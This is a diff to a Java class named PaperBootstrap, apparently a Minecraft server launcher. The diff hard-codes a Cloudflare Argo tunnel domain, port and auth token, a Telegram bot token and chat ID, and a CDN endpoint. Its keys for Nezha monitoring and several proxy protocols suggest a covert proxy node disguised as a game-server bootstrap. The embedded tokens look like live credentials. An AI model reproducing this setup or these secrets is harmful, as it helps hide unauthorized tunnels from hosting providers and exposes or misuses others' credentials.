@@ -92,22 +92,22 @@ public final class PaperBootstrap {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b385");
+        envVars.put("UUID", "40087451-ffa0-420c-8739-884a8f2bfe86");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "");
-        envVars.put("ARGO_PORT", "");
-        envVars.put("ARGO_DOMAIN", "");
-        envVars.put("ARGO_AUTH", "");
+        envVars.put("ARGO_PORT", "8001");
+        envVars.put("ARGO_DOMAIN", "mcstio.b.c.3.b.0.d.0.0.1.0.a.2.ip6.arpa");
+        envVars.put("ARGO_AUTH", "eyJhIjoiNjYzYWE3MDYwOTUwNzNhMjEyNGMxNjdhODRkYzk0ZTIiLCJ0IjoiZjY3MTgwZTktZmYyNy00ZDFlLWI0MzItOTE2ODAwMGM0MDU2IiwicyI6Ik1ETXhZekF4WmpNdE1UUXlNQzAwT1RkaExUZzVZamN0T0RjNU5XVXlPREF3TldKaCJ9");
         envVars.put("HY2_PORT", "");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
-        envVars.put("CHAT_ID", "");
-        envVars.put("BOT_TOKEN", "");
-        envVars.put("CFIP", "");
-        envVars.put("CFPORT", "");
+        envVars.put("CHAT_ID", "5730060482");
+        envVars.put("BOT_TOKEN", "8350355612:AAElgOm7GUWNgYt0ve7RwJ-WTqbMhjmSRpo");
+        envVars.put("CFIP", "cdns.doon.eu.org");
+        envVars.put("CFPORT", "443");
         envVars.put("NAME", "Mc");
         
         for (String var : ALL_ENV_VARS) {
